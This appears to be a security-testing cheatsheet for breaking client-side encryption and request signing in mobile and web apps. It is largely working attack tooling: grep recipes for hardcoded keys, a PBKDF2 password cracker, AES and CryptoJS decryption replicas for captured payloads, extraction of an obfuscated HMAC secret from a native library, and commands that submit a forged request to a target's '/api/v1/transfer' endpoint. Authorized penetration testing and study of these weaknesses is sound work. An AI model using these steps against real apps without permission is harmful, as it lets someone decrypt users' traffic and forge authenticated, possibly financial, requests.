# Crypto Replica Cheatsheet: offline decryption, forged requests, reference vectors

Command set for playbook class 5 (client-side crypto and signing) and js-reverse.md. The proof bar is always BOTH halves: an offline replica decrypting a REAL captured payload, plus a server-accepted forged request. A recovered key with no replica is a lead; a replica with no forged request is a half-proof.

## 1. Recover the material first

```bash
# APK corpus (per-stack: jadx output, blutter pools, Hermes strings):
grep -rniE 'aesKey|ivB64|secretKey|signing.?key|salt|PBKDF2|HmacSHA|AES/CBC|AES/GCM' decoded/jadx-out/ | head -20
# JS corpus:
grep -rnoE 'CryptoJS\.(AES|DES|3DES|HmacSHA256|PBKDF2)\([^)]{0,80}' js-corpus/ | head -10
# constants near the param name (hex/base64 blobs beside "sign"/"encrypt"):
grep -rB2 -A2 'X-Signature\|"sign"\|encryptParam' decoded/jadx-out/ | head -40
# iteration constants (low PBKDF2 counts are the crack):
grep -rniE 'PBEKeySpec\([^,]+,\s*[0-9]{1,5}\s*,' decoded/jadx-out/ | head -5
```

## 2. PBKDF2 password-key offline crack (when the count is low)

```python
# pbkdf2_crack.py - low iteration counts fall in minutes
import hashlib, sys
target_hex, salt, iters = sys.argv[1], bytes.fromhex(sys.argv[2]), int(sys.argv[3])
for pw in open("wordlist.txt", errors="ignore"):
    d = hashlib.pbkdf2_hmac("sha512", pw.strip().encode(), salt, iters)   # match the PRF to the code
    if d.hex() == target_hex:
        print("PASSWORD:", pw.strip()); break
```

The same derived key reused for AES transport AND JWT HS256 signing was real: crack once, forge twice.

## 3. CryptoJS "morgan"/EVP_KDF replica (vendor web stacks)

```python
# evp_kdf.py - CryptoJS.AES default KDF (md5, Salted__ header, CBC)
import hashlib
from Crypto.Cipher import AES   # pycryptodome

def evp_bytes_to_key(password: bytes, salt: bytes, key_len=32, iv_len=16):
    d = b""
    prev = b""
    while len(d) < key_len + iv_len:
        prev = hashlib.md5(prev + password + salt).digest()
        d += prev
    return d[:key_len], d[key_len:key_len + iv_len]

def decrypt_b64(data_b64: str, passphrase: str) -> bytes:
    import base64
    blob = base64.b64decode(data_b64.replace("-", "+").replace("_", "/"))
    assert blob[:8] == b"Salted__", "not a CryptoJS Salted__ blob"
    salt = blob[8:16]
    key, iv = evp_bytes_to_key(passphrase.encode(), salt)
    return AES.new(key, AES.MODE_CBC, iv).decrypt(blob[16:])

# vendor pattern: passphrase = md5(Authorization header || "morgan") for authed,
# a hardcoded fallback string for unauth traffic:
import hashlib
auth_pass = hashlib.md5(b"bearer <TOKEN>" + b"morgan").hexdigest()
print(decrypt_b64("<CAPTURED-DATA-FIELD>", auth_pass)[:80])
```

The "/"->"-" substitution in the wire format is the vendor quirk; reverse it before b64decode.

## 4. AES-GCM / AES-CBC replica from decompiled Java

```python
# match the EXACT construction read from the code (order, padding, key/iv source):
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

key = bytes.fromhex("<RECOVERED-HEX-KEY>")          # or the int-array -> bytes form
iv = b"<RECOVERED-IV>"
blob = base64.b64decode("<CAPTURED-PAYLOAD>")
# CBC with IV prepended to ciphertext (the ten-line replica shape):
plain = unpad(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]), 16)
print(plain[:120])
# GCM form (tag = last 16 bytes):
# c = AES.new(key, AES.MODE_GCM, nonce=iv); plain = c.decrypt_and_verify(blob[:-16], blob[-16:])
```

Int-array secrets in Dart pools: `bytes(array)` = `bytes(bytearray([v & 0xFF for v in array]))`.

## 5. The forge half (server acceptance is the proof)

```bash
# 1. replicate the encrypt path:
python3 forge.py --key <KEY> --iv <IV> --body '{"amount":1}'   # prints the wire blob
# 2. submit through the capture front door:
python3 bin/rh_capture.py <target> <slug> POST 'https://<TARGET>/api/v1/transfer' \
  --header 'Authorization: Bearer <TOKEN>' --header 'Content-Type: application/json' \
  --data '{"data": "<FORGED-BLOB>"}' --tag forge_accepted
# 3. the differential (garbage vs valid forge, same block):
python3 bin/rh_capture.py <target> <slug> POST 'https://<TARGET>/api/v1/transfer' \
  --header 'Authorization: Bearer <TOKEN>' --header 'Content-Type: application/json' \
  --data '{"data": "GARBAGEPADDING=="}' --tag forge_control
```

Both accepted = the "encryption" is not authentication (the finding). Forge accepted + garbage rejected = the gate is the crypto; the finding is the forgery capability itself.

## 6. Standalone Java reference vector (crypto-port attribution, BEFORE blaming the server)

```java
// RefVector.java - recompile the DECOMPILED algorithm, fixed salt+nonce via args
import javax.crypto.Cipher; import javax.crypto.spec.*; import java.util.Base64;
public class RefVector {
    public static void main(String[] a) throws Exception {
        byte[] key = hex(a[0]), iv = a[1].getBytes(), salt = a[2].getBytes(), plain = a[3].getBytes();
        // --- paste the decompiled construction here verbatim (KDF + cipher + order) ---
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
        System.out.println(Base64.getEncoder().encodeToString(c.doFinal(plain)));
    }
    static byte[] hex(String s) { byte[] b = new byte[s.length()/2];
        for (int i = 0; i < b.length; i++) b[i] = (byte) Integer.parseInt(s.substring(2*i, 2*i+2), 16); return b; }
}
```

```bash
javac RefVector.java && java RefVector <KEY-HEX> <IV> <SALT> 'fixed-test-vector'
python3 replica.py --key <KEY-HEX> --iv <IV> --salt <SALT> --plain 'fixed-test-vector'
# byte-for-byte MATCH => your port is proven; the rejection is server-side (attributed verdict).
# MISMATCH => fix the port BEFORE any "blocked" verdict (mobile.md section 9 rule 7).
```

## 7. Native-lib HMAC secret (the XOR-of-hash obfuscation)

```bash
# 1. JNI symbols (the secret will NOT be in strings):
nm -D decoded/apktool/lib/arm64-v8a/libsecrets.so | grep -i 'getsecret\|Java_'
# 2. objdump the JNI function: look for the 64-iteration EOR loop reading a static blob (adrp/add):
objdump -d decoded/apktool/lib/arm64-v8a/libsecrets.so --start-address=<FUNC> --stop-address=<FUNC+400> | grep -E 'eor|adrp|add' | head -20
# 3. compute: secret[i] = blob[i] ^ sha256(<INPUT-STRING>)[i]   (input = usually the package name)
python3 - <<'EOF'
import hashlib
blob = open("blob.bin", "rb").read()          # extracted at the adrp/add offset, len = 64
h = hashlib.sha256(b"<PACKAGE-NAME>").digest()
secret = bytes(b ^ h[i % len(h)] for i, b in enumerate(blob))
print(secret.hex())
EOF
# 4. watch for dev/stag/prod JNI variants in the same lib (three blobs, three tiers - pair each with its host)
```

## 8. Wire-construction gotchas (why forges 400)

- Gson compact wire: field names from @SerializedName (finish_url not finishUrl), no spaces, no pretty-print. The signed body is the EXACT wire bytes.
- Number types: 1000 (int) vs 1000.0 (float) serialize differently; match the construction site.
- Timestamps: ISO with `.SSS'Z'` is common; timezone shifts break signatures.
- Concatenation order: read it from the code (platform+timestamp+body, sorted-header values joined by "+", then base64, then HMAC -> hex).
- 400 "field can't be blank" on an unauth endpoint = the signature gate PASSED (fix the body shape); 401 "Invalid signature" = the gate failed (secret/canonicalization wrong, not the endpoint).
- A WRONG field name makes BOTH signed and unsigned return 400 null-validation (deserialization runs BEFORE the signature check): only a cleanly-deserializing body reveals the gate.
